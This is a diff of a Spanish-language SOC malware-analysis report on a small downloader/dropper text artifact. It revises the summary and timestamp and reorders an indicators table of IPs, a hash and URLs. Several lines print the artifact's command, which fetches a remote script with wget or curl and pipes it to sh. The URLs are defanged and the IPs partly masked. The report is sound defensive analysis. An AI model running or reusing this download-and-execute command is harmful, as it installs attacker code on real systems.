@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 374 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `sh` en `hxxps://14.46.136.XXX/sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T21:09:22+00:00`
+- **Registrado:** `2026-08-09T21:09:22.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -52,12 +53,12 @@ echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxp
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 14.46.136.XXX | static_analysis |
-| ip | 190.179.166.XXX | static_analysis |
 | url | hxxps://14.46.136.XXX/sh | strings |
 | url | hxxps://14.46.136.XXX/sh) | strings |
-| hash | c987a80449bf77c3265ab0c38fc357d4e01c7aaa8c094a5d4d9ee82c327afcd2 | static_analysis |
+| ip | 14.46.136.XXX | static_analysis |
+| ip | 190.179.166.XXX | static_analysis |
 | command | echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfr | strings |
+| hash | c987a80449bf77c3265ab0c38fc357d4e01c7aaa8c094a5d4d9ee82c327afcd2 | static_analysis |
 | ip | 107.167.94.XXX | artifact_source |
 
 ## 🔎 Triage
